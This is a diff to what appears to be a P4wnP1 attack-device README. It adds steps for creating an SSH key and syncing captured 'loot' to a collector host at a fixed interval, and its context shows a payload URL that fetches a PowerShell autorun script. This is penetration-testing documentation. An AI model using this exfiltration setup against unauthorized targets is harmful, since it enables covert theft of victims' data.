@@ -338,6 +338,22 @@ base = os.getenv("P4WN_PAYLOAD_URL_TLS") if os.getenv("P4WN_PAYLOAD_SCHEME")=="h
 url  = base + os.getenv("PAYLOAD_FILE", "autorun.ps1")
 ```
 
+# 1) Create a dedicated SSH key on the Pi
+ssh-keygen -t ed25519 -N "" -f /opt/p4wnp1/config/sync_id_ed25519
+
+# 2) Authorize it on your collector
+ssh-copy-id -i /opt/p4wnp1/config/sync_id_ed25519.pub loot@10.0.0.5
+# …or append the .pub to ~/.ssh/authorized_keys on the server
+
+# 3) Point P4wnP1 at your collector (interval in seconds)
+p4wnctl wifi sync config set \
+  --host 10.0.0.5 --user loot --dest /srv/p4wnp1 --interval 60
+
+# 4) Start / stop / check
+p4wnctl wifi sync start
+p4wnctl wifi sync status
+p4wnctl wifi sync stop
+
 ---
 
 ## Credits
